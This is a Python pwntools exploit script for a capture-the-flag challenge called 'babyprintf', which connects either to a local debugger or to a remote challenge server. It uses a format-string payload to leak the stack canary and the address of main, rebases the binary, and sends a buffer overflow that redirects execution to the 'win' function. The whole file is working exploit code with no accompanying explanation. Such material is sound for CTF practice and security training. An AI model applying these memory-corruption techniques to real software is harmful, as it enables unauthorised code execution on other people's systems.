#!/usr/bin/env python3

from pwn import *

elf = ELF("./babyprintf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ()

def conn():
    if args.REMOTE:
        r = remote('baby-printf.challs.olicyber.it', 34004)
    else:
        r = gdb.debug('./babyprintf_patched', '''
            b *main+125
            c
            ''', 
            env={'FLAG':'flag{palle}'}
        )
    return r


def main():
    p = conn()

    p.recvuntil(b"back:\n")
    p.sendline(b"%11$p%15$p")
    res = p.recvline().strip()[2:].split(b'0x')
    canary = res[0]
    main_addr = int(res[1], 16)
    print(canary)
    #buffer 40 
    elf.address = main_addr - elf.sym['main']
    print('win address: ', elf.sym['win'])
    payload = b'!q' + b'a'*38 + p64(int(canary,16)) + b'a'*8 + p64(elf.sym['win'])
    p.sendline(payload) 
    p.interactive()

    
if __name__ == "__main__":
    main()
